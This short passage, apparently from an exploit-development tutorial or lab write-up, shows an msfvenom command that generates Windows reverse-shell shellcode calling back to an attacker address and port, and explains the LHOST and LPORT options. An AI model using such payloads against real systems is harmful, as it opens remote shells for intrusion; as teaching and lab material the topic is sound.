Generating shellcode means we need a way in which our victim is going to connect back to us, We will be using **msfvenom** for this, our payload will be :

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.157 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"  
```

**LHOST:** the IP in which the target is gonna connect back to
**LPORT:** the port in which target will connect back to